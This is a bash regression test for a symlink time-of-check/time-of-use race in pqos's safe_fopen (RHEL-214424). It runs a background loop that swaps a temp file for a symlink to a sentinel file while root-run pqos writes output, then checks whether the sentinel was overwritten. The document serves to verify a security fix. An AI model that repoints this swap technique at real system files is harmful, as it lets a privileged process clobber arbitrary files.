#!/bin/bash
#
# test-symlink-race.sh - Test for TOCTOU symlink race in pqos safe_fopen
#                        (RHEL-214424)
#
# The vulnerability is a time-of-check/time-of-use (TOCTOU) race in the
# original safe_fopen() implementation.  The old code calls lstat() to
# verify the path is not a symlink, then calls fopen() to open it.
# Between those two calls there is a window where an attacker can swap a
# regular file for a symlink, causing pqos to follow the symlink and
# truncate or overwrite an arbitrary file.
#
# The fix replaces fopen() with open(O_NOFOLLOW) + fdopen(), making the
# symlink check and the open a single atomic kernel operation.
#
# This test attempts to exploit the race by running a background process
# that rapidly swaps a regular file and a symlink at the output path
# while pqos tries to open it repeatedly.  Because the race window is
# very narrow (microseconds between lstat and fopen), this test may PASS
# even on unpatched code — the race is real but difficult to trigger
# deterministically.  A FAIL result conclusively proves the vulnerability;
# a PASS result on unpatched code does NOT prove its absence.
#
# On patched code, the test will always PASS because O_NOFOLLOW rejects
# symlinks atomically regardless of timing.
#
# Must be run as root on a system with RDT/CAT support (x86_64).
#
# Usage:
#   sudo ./test-symlink-race.sh [path-to-pqos]
#
# Exit codes:
#   0 - PASS (target file survived all iterations)
#   1 - FAIL (pqos followed a symlink — vulnerability confirmed)
#   2 - SKIP (cannot run test — missing prerequisites)
#

set -euo pipefail

PQOS="${1:-$(command -v pqos 2>/dev/null || echo "")}"
TESTDIR=$(mktemp -d /tmp/symlink-race-test.XXXXXX)
ITERATIONS=50

OFF=$'\033[0m'
PASS=$'\033[1;32m'
FAIL=$'\033[1;31m'
INFO=$'\033[0;36m'
WARN=$'\033[0;33m'

cleanup() {
    # Kill the swapper if still running
    [[ -n "${SWAPPER_PID:-}" ]] && kill "$SWAPPER_PID" 2>/dev/null || true
    wait "$SWAPPER_PID" 2>/dev/null || true
    rm -rf "$TESTDIR"
}
trap cleanup EXIT

echo -e "${INFO}=== pqos symlink TOCTOU race test (RHEL-214424) ===${OFF}"
echo ""
echo -e "${INFO}NOTE:${OFF} The vulnerability is a narrow TOCTOU race between lstat()"
echo "  and fopen() in the original safe_fopen().  This test tries to hit"
echo "  that window by rapidly swapping a regular file and a symlink while"
echo "  pqos opens the path.  Because the window is only microseconds wide,"
echo "  the test may PASS on unpatched code simply because the swap didn't"
echo "  land in the gap.  A FAIL conclusively proves the bug; a PASS does"
echo "  not guarantee its absence on unpatched builds."
echo ""

# --- Prerequisite checks ---

if [[ $(id -u) -ne 0 ]]; then
    echo -e "${WARN}SKIP:${OFF} Must be run as root (pqos requires MSR/resctrl access)"
    exit 2
fi

if [[ -z "$PQOS" || ! -x "$PQOS" ]]; then
    echo -e "${WARN}SKIP:${OFF} pqos not found. Provide path as argument."
    echo "  Usage: sudo $0 /path/to/pqos"
    exit 2
fi

echo -e "${INFO}pqos:${OFF} $PQOS"
echo -e "${INFO}iterations:${OFF} $ITERATIONS"
echo ""

# --- Set up files ---

TARGET="$TESTDIR/sensitive-file.txt"
OUTPUT="$TESTDIR/pqos-output.csv"
REGULAR="$TESTDIR/regular-file.tmp"
SENTINEL="THIS_DATA_MUST_SURVIVE"

echo "$SENTINEL" > "$TARGET"

echo -e "${INFO}Target file:${OFF} $TARGET"
echo -e "${INFO}Output path:${OFF} $OUTPUT"
echo ""

# --- Symlink swapper ---
#
# Tight loop: alternate the output path between a regular file and a
# symlink to the target.  The goal is to have a regular file in place
# when lstat() runs, then swap it for a symlink before fopen() runs.

swapper() {
    while true; do
        rm -f "$OUTPUT"
        touch "$OUTPUT"
        rm -f "$OUTPUT"
        ln -s "$TARGET" "$OUTPUT"
    done
}

swapper &
SWAPPER_PID=$!

# --- Run the race ---

echo -e "${INFO}Running $ITERATIONS attempts to trigger the race...${OFF}"

hit=0
for (( i = 1; i <= ITERATIONS; i++ )); do
    # Reset the target each iteration
    echo "$SENTINEL" > "$TARGET"

    # Run pqos briefly; suppress output — we only care about the target
    "$PQOS" -o "$OUTPUT" -t 1 >/dev/null 2>&1 || true

    # Check if the target was clobbered
    if [[ ! -f "$TARGET" ]]; then
        echo -e "  ${FAIL}Hit on iteration $i:${OFF} target file deleted!"
        hit=1
        break
    fi

    contents=$(cat "$TARGET")
    if [[ "$contents" != "$SENTINEL" ]]; then
        echo -e "  ${FAIL}Hit on iteration $i:${OFF} target file overwritten!"
        echo "    Expected: $SENTINEL"
        echo "    Got:      $contents"
        hit=1
        break
    fi
done

# Stop the swapper
kill "$SWAPPER_PID" 2>/dev/null || true
wait "$SWAPPER_PID" 2>/dev/null || true
unset SWAPPER_PID

echo ""

# --- Results ---

if [[ "$hit" -eq 1 ]]; then
    echo -e "${FAIL}FAIL:${OFF} Symlink race triggered — pqos followed a symlink!"
    echo ""
    echo "  The TOCTOU window between lstat() and fopen() was exploited."
    echo "  This confirms the vulnerability described in RHEL-214424."
    exit 1
else
    echo -e "${PASS}PASS:${OFF} Target file survived all $ITERATIONS iterations."
    echo ""
    echo "  On patched code (O_NOFOLLOW), this is expected — the race"
    echo "  window is eliminated entirely."
    echo ""
    echo "  On unpatched code, this may simply mean the race was not won"
    echo "  in $ITERATIONS attempts.  The TOCTOU window is real but narrow."
    exit 0
fi
